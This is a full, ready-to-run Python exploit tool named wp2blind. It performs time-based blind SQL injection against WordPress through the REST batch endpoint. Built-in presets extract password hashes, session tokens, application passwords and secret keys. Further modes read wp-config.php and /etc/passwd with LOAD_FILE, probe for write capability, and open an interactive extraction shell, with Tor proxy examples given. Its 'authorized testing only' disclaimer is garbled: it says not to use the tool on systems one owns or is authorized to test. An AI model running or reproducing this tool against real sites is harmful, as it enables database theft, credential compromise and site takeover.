#!/usr/bin/env python3
"""
wp2blind v3.0
Author  : saretawa
Purpose : Authorized penetration testing and educational use only.
          Do not use against systems you own or have explicit written
          authorization to test.
CVEs    : CVE-2026-60137 / CVE-2026-63030
"""

import argparse
import json
import logging
import re
import statistics
import sys
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Callable, Optional

try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    sys.exit("[-] pip install requests")

VERSION = "3.0"
UA      = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           "AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/126.0.0.0 Safari/537.36")
SPINNER = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

logger = logging.getLogger("wp2blind")


class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    WHITE   = "\033[97m"

    @classmethod
    def off(cls):
        for a in list(vars(cls)):
            if not a.startswith("_") and a != "off":
                if isinstance(getattr(cls, a), str):
                    setattr(cls, a, "")


def setup_logging(verbose: bool):
    handler = logging.StreamHandler(sys.stderr)
    handler.setFormatter(logging.Formatter(
        f"{C.DIM}%(asctime)s  %(levelname)-7s  %(message)s{C.RESET}",
        datefmt="%H:%M:%S",
    ))
    logger.setLevel(logging.DEBUG if verbose else logging.WARNING)
    logger.addHandler(handler)
    logger.propagate = False


def banner() -> str:
    return (
        f"{C.CYAN}{C.BOLD}"
        "  ██╗    ██╗██████╗ ██████╗ ██████╗ ██╗     ██╗███╗   ██╗██████╗\n"
        "  ██║    ██║██╔══██╗╚════██╗██╔══██╗██║     ██║████╗  ██║██╔══██╗\n"
        "  ██║ █╗ ██║██████╔╝ █████╔╝██████╔╝██║     ██║██╔██╗ ██║██║  ██║\n"
        "  ██║███╗██║██╔═══╝ ██╔═══╝ ██╔══██╗██║     ██║██║╚██╗██║██║  ██║\n"
        "  ╚███╔███╔╝██║     ███████╗██████╔╝███████╗██║██║ ╚████║██████╔╝\n"
        "   ╚══╝╚══╝ ╚═╝     ╚══════╝╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝╚═════╝"
        f"{C.RESET}\n"
        f"  {C.DIM}v{VERSION}  ·  CVE-2026-60137 / CVE-2026-63030  ·  by saretawa{C.RESET}\n"
        f"  {C.DIM}authorized penetration testing and educational use only{C.RESET}\n"
    )


WPCONFIG_PATHS = [
    "/var/www/html/wp-config.php",
    "/var/www/wp-config.php",
    "/srv/www/wp-config.php",
    "/var/www/html/wordpress/wp-config.php",
    "/usr/share/wordpress/wp-config.php",
    "/home/www/wp-config.php",
    "/www/wp-config.php",
    "/opt/bitnami/wordpress/wp-config.php",
    "/var/www/vhosts/default/htdocs/wp-config.php",
    "/var/www/public_html/wp-config.php",
    "/home/user/public_html/wp-config.php",
]

PRESETS: dict[str, tuple[str, bool]] = {
    "version":        ("@@version",                                                              False),
    "database":       ("DATABASE()",                                                             False),
    "db_user":        ("CURRENT_USER()",                                                         False),
    "hostname":       ("@@hostname",                                                             False),
    "datadir":        ("@@datadir",                                                              False),
    "basedir":        ("@@basedir",                                                              False),
    "secure_file":    ("@@secure_file_priv",                                                     False),
    "file_priv":      ("SELECT file_priv FROM mysql.user WHERE user=user()",                     False),
    "tables":         ("SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR 0x0a) "
                       "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()",           False),
    "prefix":         ("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
                       "WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME LIKE '%users' LIMIT 1",    False),
    "users":          ("SELECT CONCAT_WS(0x3a,user_login,user_pass) "
                       "FROM {p}users ORDER BY ID ASC LIMIT 1",                                  True),
    "all_users":      ("SELECT GROUP_CONCAT(user_login,0x3a,user_pass SEPARATOR 0x0a) "
                       "FROM {p}users LIMIT 10",                                                 True),
    "session_tokens": ("SELECT meta_value FROM {p}usermeta "
                       "WHERE meta_key='session_tokens' "
                       "ORDER BY umeta_id DESC LIMIT 1",                                         True),
    "app_passwords":  ("SELECT meta_value FROM {p}usermeta "
                       "WHERE meta_key='_application_passwords' LIMIT 1",                        True),
    "secret_keys":    ("SELECT GROUP_CONCAT(option_name,0x3a,option_value SEPARATOR 0x0a) "
                       "FROM {p}options WHERE option_name IN "
                       "('auth_key','secure_auth_key','logged_in_key','nonce_key',"
                       "'auth_salt','secure_auth_salt','logged_in_salt','nonce_salt')",           True),
    "siteurl":        ("SELECT option_value FROM {p}options "
                       "WHERE option_name=0x7369746575726c LIMIT 1",                             True),
    "admin_email":    ("SELECT option_value FROM {p}options "
                       "WHERE option_name='admin_email' LIMIT 1",                                True),
    "activation_key": ("SELECT user_activation_key FROM {p}users "
                       "WHERE user_login='admin' LIMIT 1",                                       True),
}


def ok(msg):   print(f"{C.GREEN}[+]{C.RESET} {msg}")
def info(msg): print(f"{C.YELLOW}[*]{C.RESET} {msg}")
def err(msg):  print(f"{C.RED}[-]{C.RESET} {msg}")
def data(msg): print(f"{C.CYAN}{C.BOLD}[>]{C.RESET} {msg}")


def live_bar(current: str, req_count: int, spin_idx: int):
    spin = SPINNER[spin_idx % len(SPINNER)]
    sys.stdout.write(
        f"\r  {C.CYAN}{spin}{C.RESET} "
        f"{C.DIM}[{req_count:4d} req]{C.RESET}  "
        f"{C.WHITE}{current}{C.RESET}   "
    )
    sys.stdout.flush()


def clear_bar():
    sys.stdout.write("\r" + " " * 110 + "\r")
    sys.stdout.flush()


def print_result(label: str, value: str, outfile: Optional[str] = None):
    if not value:
        err(f"{label}: empty / NULL")
        return
    print(f"\n{C.CYAN}{'=' * 62}{C.RESET}")
    print(f"{C.GREEN}{C.BOLD}  {label}{C.RESET}")
    print(f"{C.CYAN}{'=' * 62}{C.RESET}")
    print(value)
    print(f"{C.CYAN}{'=' * 62}{C.RESET}\n")
    if outfile:
        with open(outfile, "a") as f:
            f.write(f"[{label}]\n{value}\n\n")
        info(f"saved: {outfile}")


def parse_wpconfig(content: str):
    patterns = {
        "DB_NAME":      r"define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]",
        "DB_USER":      r"define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]",
        "DB_PASSWORD":  r"define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]",
        "DB_HOST":      r"define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]",
        "table_prefix": r"\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]",
    }
    found = {k: m.group(1) for k, p in patterns.items()
             if (m := re.search(p, content, re.I | re.S))}
    if found:
        print(f"\n{C.GREEN}{C.BOLD}  credentials:{C.RESET}")
        for k, v in found.items():
            print(f"  {C.CYAN}{k:<16}{C.RESET} {v}")
        print()


def resolve_expr(expr: Optional[str], preset: Optional[str], prefix: str) -> Optional[str]:
    if expr:
        return expr
    if preset:
        if preset not in PRESETS:
            sys.exit(f"{C.RED}[-]{C.RESET} unknown preset '{preset}', "
                     f"choices: {', '.join(PRESETS)}")
        sql, needs_p = PRESETS[preset]
        return sql.format(p=prefix) if needs_p else sql
    return None


class ForceHTTP1Adapter(requests.adapters.HTTPAdapter):

    def __init__(self, verify_ssl: bool = True, **kwargs):
        self._verify_ssl = verify_ssl
        super().__init__(**kwargs)

    def _make_ctx(self):
        try:
            import ssl
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.set_alpn_protocols(["http/1.1"])
            if not self._verify_ssl:
                ctx.check_hostname = False
                ctx.verify_mode    = ssl.CERT_NONE
            else:
                ctx.load_default_certs()
            return ctx
        except Exception:
            return None

    def init_poolmanager(self, *args, **kwargs):
        ctx = self._make_ctx()
        if ctx:
            kwargs["ssl_context"] = ctx
        super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, proxy, **proxy_kwargs):
        ctx = self._make_ctx()
        if ctx:
            proxy_kwargs["ssl_context"] = ctx
        return super().proxy_manager_for(proxy, **proxy_kwargs)


def make_session(proxy: Optional[str], verify_ssl: bool) -> requests.Session:
    s = requests.Session()
    s.headers.update({
        "User-Agent":   UA,
        "Content-Type": "application/json",
        "Connection":   "close",
    })
    adapter = ForceHTTP1Adapter(verify_ssl=verify_ssl)
    s.mount("http://",  adapter)
    s.mount("https://", adapter)
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    s.verify = verify_ssl
    return s


def build_payload(condition: str, delay: float) -> dict:
    inject = "SELECT IF((%s),SLEEP(%s),0)" % (condition, delay)
    query  = urllib.parse.urlencode({"author_exclude": inject})
    return {
        "requests": [
            {"method": "POST", "path": "http://:"},
            {"method": "POST", "path": "/wp/v2/posts", "body": {
                "requests": [
                    {"method": "GET", "path": "http://:"},
                    {"method": "GET", "path": "/wp/v2/categories?" + query},
                    {"method": "GET", "path": "/wp/v2/posts"},
                ]
            }},
            {"method": "POST", "path": "/batch/v1"},
        ]
    }


class Oracle:

    def __init__(self, url: str, proxy: Optional[str], verify_ssl: bool,
                 delay: float, timeout: int, repeats: int, threads: int):
        self.endpoint  = url.rstrip("/") + "/?rest_route=/batch/v1"
        self.proxy     = proxy
        self.verify    = verify_ssl
        self.delay     = delay
        self.timeout   = timeout
        self.repeats   = repeats
        self.threads   = threads
        self.cutoff    = None
        self._base     = 0.0
        self.req_count = 0
        self._spin     = 0
        self._lock     = threading.Lock()
        self._local    = threading.local()

    def _session(self) -> requests.Session:
        if not hasattr(self._local, "session"):
            self._local.session = make_session(self.proxy, self.verify)
        return self._local.session

    def _send(self, payload: dict) -> float:
        data = json.dumps(payload).encode()
        for attempt in range(10):
            t0 = time.perf_counter()
            try:
                r = self._session().post(
                    self.endpoint, data=data, timeout=self.timeout)
                elapsed = time.perf_counter() - t0
                with self._lock:
                    self.req_count += 1
                logger.debug("%.3fs  HTTP %d", elapsed, r.status_code)
                return elapsed
            except requests.Timeout:
                elapsed = time.perf_counter() - t0
                with self._lock:
                    self.req_count += 1
                return elapsed
            except requests.ConnectionError as e:
                if "HTTP/2" in str(e) or "UnknownProtocol" in str(e):
                    backoff = 0.3 * (attempt + 1)
                    logger.warning("HTTP/2 error, retry %d/10, backoff %.1fs",
                                   attempt + 1, backoff)
                    if hasattr(self._local, "session"):
                        del self._local.session
                    time.sleep(backoff)
                    continue
                sys.exit(f"\n{C.RED}[-]{C.RESET} connection error: {e}")
            except requests.RequestException as e:
                sys.exit(f"\n{C.RED}[-]{C.RESET} request error: {e}")
        sys.exit(f"\n{C.RED}[-]{C.RESET} gave up after 10 HTTP/2 retries, "
                 "try --threads 1")

    def _send_raw(self, raw_inject: str) -> float:
        q = urllib.parse.quote(raw_inject, safe="")
        return self._send({
            "requests": [
                {"method": "POST", "path": "http://:"},
                {"method": "POST", "path": "/wp/v2/posts", "body": {
                    "requests": [
                        {"method": "GET", "path": "http://:"},
                        {"method": "GET", "path": "/wp/v2/categories?author_exclude=" + q},
                        {"method": "GET", "path": "/wp/v2/posts"},
                    ]
                }},
                {"method": "POST", "path": "/batch/v1"},
            ]
        })

    def probe(self, condition: str) -> float:
        payload = build_payload(condition, self.delay)
        if self.repeats == 1:
            return self._send(payload)
        return statistics.median(self._send(payload) for _ in range(self.repeats))

    def calibrate(self, rounds: int = 3) -> tuple[float, float]:
        info("calibrating timing oracle ...")
        fast = statistics.median(self.probe("1=0") for _ in range(rounds))
        slow = statistics.median(self.probe("1=1") for _ in range(rounds))
        self.cutoff = (fast + slow) / 2
        self._base  = fast
        margin = slow - fast
        col = C.GREEN if margin > self.delay * 0.5 else C.RED
        info(
            f"fast={C.DIM}{fast:.3f}s{C.RESET}  "
            f"slow={C.DIM}{slow:.3f}s{C.RESET}  "
            f"margin={col}{margin:.3f}s{C.RESET}  "
            f"cutoff={C.DIM}{self.cutoff:.3f}s{C.RESET}"
        )
        return fast, slow

    def ask(self, condition: str) -> bool:
        return self.probe(condition) > self.cutoff

    def _length(self, vexpr: str, cap: int) -> int:
        lo, hi = 0, cap
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.ask("CHAR_LENGTH(%s)>=%d" % (vexpr, mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _extract_char(self, vexpr: str, pos: int) -> str:
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.ask("ASCII(SUBSTRING(%s,%d,1))>=%d" % (vexpr, pos, mid)):
                lo = mid
            else:
                hi = mid - 1
        return chr(lo)

    def extract(self, expr: str, cap: int = 256,
                on_progress: Optional[Callable[[str, int, int], None]] = None) -> str:
        v = "COALESCE((%s),'')" % expr
        n = self._length(v, cap)
        if n == 0:
            return ""
        if self.threads <= 1:
            return self._extract_sequential(v, n, on_progress)
        return self._extract_parallel(v, n, on_progress)

    def _extract_sequential(self, vexpr: str, n: int,
                             on_progress: Optional[Callable]) -> str:
        out = ""
        for pos in range(1, n + 1):
            out += self._extract_char(vexpr, pos)
            with self._lock:
                self._spin += 1
                spin, rc = self._spin, self.req_count
            if on_progress:
                on_progress(out, rc, spin)
        return out

    def _extract_parallel(self, vexpr: str, n: int,
                           on_progress: Optional[Callable]) -> str:
        results: list[Optional[str]] = [None] * n

        def work(pos: int) -> tuple[int, str]:
            c = self._extract_char(vexpr, pos + 1)
            with self._lock:
                results[pos] = c
                self._spin  += 1
                spin, rc     = self._spin, self.req_count
            if on_progress:
                current = "".join(c if c is not None else "·" for c in results)
                on_progress(current, rc, spin)
            return pos, c

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futures = [pool.submit(work, pos) for pos in range(n)]
            for f in as_completed(futures):
                f.result()

        return "".join(results)

    def extract_int(self, expr: str) -> int:
        v = "COALESCE((%s),0)" % expr
        lo, hi = 0, 1
        while self.ask("%s>=%d" % (v, hi)):
            lo, hi = hi, hi * 2
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.ask("%s>=%d" % (v, mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo


def _make_oracle(args) -> Oracle:
    return Oracle(
        url        = args.url,
        proxy      = args.proxy,
        verify_ssl = not args.no_verify,
        delay      = args.delay,
        timeout    = args.timeout,
        repeats    = args.repeats,
        threads    = args.threads,
    )


def cmd_check(args):
    ora = _make_oracle(args)
    fast, slow = ora.calibrate(rounds=args.rounds)
    margin = slow - fast
    needed = max(0.08, args.delay * 0.5)
    if margin < needed:
        err(f"not vulnerable, margin {margin:.3f}s below {needed:.3f}s")
        info("raise --delay or --repeats on noisy links")
        return 1
    ok(f"{C.BOLD}VULNERABLE{C.RESET} blind time-based SQLi confirmed")
    ok("CVE-2026-60137 via CVE-2026-63030")
    ok(f"margin {C.GREEN}{margin:.3f}s{C.RESET}  delay={args.delay}s  repeats={args.repeats}")
    return 0


def cmd_read(args):
    expr = resolve_expr(args.expr, args.preset, args.prefix)
    if not expr:
        sys.exit(f"{C.RED}[-]{C.RESET} provide --expr or --preset")
    ora   = _make_oracle(args)
    label = args.expr or args.preset
    ora.calibrate(rounds=args.rounds)
    if args.threads > 1:
        info(f"extracting ({args.threads} threads): {C.DIM}{label}{C.RESET}")
    else:
        info(f"extracting: {C.DIM}{label}{C.RESET}")
    t0     = time.time()
    result = ora.extract(expr, cap=args.max_len, on_progress=live_bar)
    clear_bar()
    elapsed = time.time() - t0
    print_result(label, result, args.output)
    info(f"{ora.req_count} requests  ·  {elapsed:.1f}s  ·  {args.threads} thread(s)")
    return 0


def cmd_wpconfig(args):
    ora = _make_oracle(args)
    ora.calibrate(rounds=args.rounds)

    info("checking FILE privilege ...")
    fp = ora.extract("SELECT file_priv FROM mysql.user WHERE user=user()", cap=4)
    if fp.strip().upper() == "N":
        err("FILE privilege: NO, LOAD_FILE blocked for this user")
        return 1
    if fp.strip().upper() == "Y":
        ok("FILE privilege: YES")
    else:
        info(f"FILE privilege: '{fp}', attempting anyway")

    info("checking @@secure_file_priv ...")
    sfp = ora.extract("@@secure_file_priv", cap=256)
    if sfp:
        info(f"secure_file_priv = '{sfp}'")
        if sfp.strip().upper() in ("NULL", "\\N"):
            err("secure_file_priv is NULL, LOAD_FILE disabled globally")
            return 1
    else:
        ok("secure_file_priv = '' (no path restriction)")

    paths = args.paths if args.paths else WPCONFIG_PATHS
    for path in paths:
        info(f"trying {C.DIM}{path}{C.RESET}")
        result = ora.extract(f"LOAD_FILE('{path}')", cap=args.max_len, on_progress=live_bar)
        clear_bar()
        if result:
            ok(f"found: {path}")
            print_result(f"LOAD_FILE({path})", result, args.output)
            parse_wpconfig(result)
            info(f"{ora.req_count} total requests")
            return 0
        err("empty")

    err("wp-config.php not found at common paths")
    info("try: --read --expr \"@@datadir\" to locate MySQL data dir")
    return 1


def cmd_stacktest(args):
    ora = _make_oracle(args)
    fast, slow = ora.calibrate(rounds=args.rounds)
    margin = slow - fast
    if margin < args.delay * 0.5:
        err("oracle too noisy, raise --delay")
        return 1

    info("probing stacked query support ...")

    t1 = ora._send_raw(f"; SELECT SLEEP({args.delay}) -- -")
    info(f"'; SELECT SLEEP' response: {t1:.3f}s  (baseline: {fast:.3f}s)")
    if t1 > fast + args.delay * 0.6:
        ok(f"{C.BOLD}STACKED QUERIES SUPPORTED{C.RESET}")
        ok("multi-statement confirmed, INSERT/UPDATE injectable")
        return 0

    t2 = ora._send_raw(f"0) -- - ; SELECT SLEEP({args.delay}) -- -")
    info(f"comment-terminate response: {t2:.3f}s")
    if t2 > fast + args.delay * 0.6:
        ok(f"{C.BOLD}STACKED QUERIES SUPPORTED{C.RESET} (comment-terminate variant)")
        return 0

    err("stacked queries not supported")
    info("single-statement mysqli, no direct write path")
    return 1


def cmd_shell(args):
    ora    = _make_oracle(args)
    prefix = args.prefix
    ora.calibrate(rounds=args.rounds)

    print(f"\n{C.CYAN}{C.BOLD}  wp2blind interactive SQL shell{C.RESET}")
    print(f"  {C.DIM}enter any SQL scalar, extracted via time oracle{C.RESET}")
    print(f"  {C.DIM}cmds: .presets  .delay N  .maxlen N  .threads N  .prefix P  .exit{C.RESET}\n")

    max_len = args.max_len

    while True:
        try:
            line = input(f"{C.MAGENTA}wp2blind{C.RESET}{C.DIM}>{C.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        if line in (".exit", "exit", "quit", "q"):
            break

        if line == ".presets":
            print(f"\n{C.CYAN}  presets:{C.RESET}")
            for name, (sql, _) in PRESETS.items():
                print(f"  {C.BOLD}{name:<18}{C.RESET}{C.DIM}{sql[:66]}{C.RESET}")
            print()
            continue

        if line.startswith(".delay "):
            try:
                ora.delay  = float(line.split()[1])
                ora.cutoff = None
                info(f"delay set to {ora.delay}s, recalibrating ...")
                ora.calibrate(rounds=args.rounds)
            except (IndexError, ValueError):
                err("usage: .delay <seconds>")
            continue

        if line.startswith(".maxlen "):
            try:
                max_len = int(line.split()[1])
                info(f"max_len set to {max_len}")
            except (IndexError, ValueError):
                err("usage: .maxlen <n>")
            continue

        if line.startswith(".threads "):
            try:
                ora.threads = int(line.split()[1])
                info(f"threads set to {ora.threads}")
            except (IndexError, ValueError):
                err("usage: .threads <n>")
            continue

        if line.startswith(".prefix "):
            parts  = line.split(None, 1)
            prefix = parts[1] if len(parts) > 1 else "wp_"
            info(f"prefix set to '{prefix}'")
            continue

        if line in PRESETS:
            sql, needs_p = PRESETS[line]
            expr = sql.format(p=prefix) if needs_p else sql
        else:
            expr = line.replace("{p}", prefix)

        t0     = time.time()
        result = ora.extract(expr, cap=max_len, on_progress=live_bar)
        clear_bar()
        elapsed = time.time() - t0

        if result:
            data(result)
            if args.output:
                with open(args.output, "a") as f:
                    f.write(f"[{expr[:80]}]\n{result}\n\n")
        else:
            err("empty, NULL / no rows / no FILE priv")
        info(f"{ora.req_count} req total  ·  {elapsed:.1f}s  ·  {ora.threads} thread(s)")

    info(f"session ended  ·  {ora.req_count} total requests")


MODES = {
    "check":     cmd_check,
    "read":      cmd_read,
    "wpconfig":  cmd_wpconfig,
    "stacktest": cmd_stacktest,
    "shell":     cmd_shell,
}


class BannerParser(argparse.ArgumentParser):
    def print_help(self, file=None):
        print(banner())
        super().print_help(file)


def build_parser() -> argparse.ArgumentParser:
    ap = BannerParser(
        prog="wp2blind",
        description=f"wp2blind v{VERSION}  CVE-2026-60137 / CVE-2026-63030",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
modes:
  check       confirm blind SQLi oracle (non-destructive)
  read        extract any SQL scalar via --preset or --expr
  wpconfig    auto-probe wp-config.php paths via LOAD_FILE
  stacktest   probe for stacked query / write capability
  shell       interactive blind SQL extraction shell

examples:
  python3 wp2blind.py check     http://target --proxy http://127.0.0.1:8080 --delay 3
  python3 wp2blind.py read      http://target --preset users --delay 3
  python3 wp2blind.py read      http://target --preset session_tokens --delay 3 --threads 3
  python3 wp2blind.py read      http://target --expr "SELECT user_pass FROM wp_users LIMIT 1"
  python3 wp2blind.py read      http://target --expr "LOAD_FILE('/etc/passwd')" --max-len 4096
  python3 wp2blind.py wpconfig  http://target --delay 3
  python3 wp2blind.py stacktest http://target --delay 3
  python3 wp2blind.py shell     http://target --proxy socks5://127.0.0.1:9050 --threads 3

proxy:
  --proxy http://127.0.0.1:8080      HTTP (Burp / ZAP)
  --proxy socks5://127.0.0.1:9050    SOCKS5
  --proxy socks4://127.0.0.1:9050    SOCKS4
  SOCKS requires: pip install requests[socks]

threading:
  --threads 1   sequential, most reliable (default)
  --threads 3   good balance on stable links
  --threads 5   fast on low-latency targets
  calibration always runs single-threaded

presets:
  version, database, db_user, hostname, datadir, basedir,
  secure_file, file_priv, tables, prefix,
  users, all_users, session_tokens, app_passwords,
  secret_keys, siteurl, admin_email, activation_key
        """
    )

    ap.add_argument("mode", choices=list(MODES), help="operation mode")
    ap.add_argument("url",  help="target WordPress base URL")

    g = ap.add_argument_group("oracle tuning")
    g.add_argument("--delay",   type=float, default=2.0,
                   help="SLEEP seconds per oracle bit (default: 2.0)")
    g.add_argument("--repeats", type=int,   default=1,
                   help="probes per bit, median taken (default: 1)")
    g.add_argument("--rounds",  type=int,   default=3,
                   help="calibration rounds (default: 3)")
    g.add_argument("--timeout", type=int,   default=20,
                   help="per-request timeout in seconds (default: 20)")
    g.add_argument("--max-len", type=int,   default=256,
                   help="max extraction length in chars (default: 256)")
    g.add_argument("--prefix",  default="wp_",
                   help="WordPress DB table prefix (default: wp_)")
    g.add_argument("--threads", type=int,   default=1,
                   help="parallel extraction threads (default: 1)")

    g = ap.add_argument_group("read / shell")
    g.add_argument("--preset", choices=list(PRESETS), help="built-in extraction preset")
    g.add_argument("--expr",   help="raw SQL scalar expression to extract")

    g = ap.add_argument_group("wpconfig")
    g.add_argument("--paths", nargs="+", help="custom wp-config.php path(s) to probe")

    g = ap.add_argument_group("transport")
    g.add_argument("--proxy",     help="proxy URL (http://, socks5://, socks4://)")
    g.add_argument("--no-verify", action="store_true",
                   help="skip TLS certificate verification")

    g = ap.add_argument_group("output")
    g.add_argument("--output",   metavar="FILE", help="append results to file")
    g.add_argument("--no-color", action="store_true", help="disable ANSI colors")
    g.add_argument("--verbose",  "-v", action="store_true",
                   help="debug logging: per-request timing and retries")
    g.add_argument("--quiet",    "-q", action="store_true", help="suppress banner")

    return ap


def main():
    ap   = build_parser()
    args = ap.parse_args()

    if args.no_color:
        C.off()

    setup_logging(args.verbose)

    if not args.quiet:
        print(banner())

    min_timeout = int(args.delay * 2 + 10)
    if args.timeout < min_timeout:
        args.timeout = min_timeout
        info(f"timeout adjusted to {args.timeout}s")

    if args.threads < 1:
        args.threads = 1

    if args.proxy and args.proxy.startswith("socks"):
        try:
            import socks
        except ImportError:
            sys.exit(f"{C.RED}[-]{C.RESET} SOCKS requires: pip install requests[socks]")

    try:
        rc = MODES[args.mode](args)
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[!]{C.RESET} interrupted")
        rc = 130

    sys.exit(rc or 0)


if __name__ == "__main__":
    main()
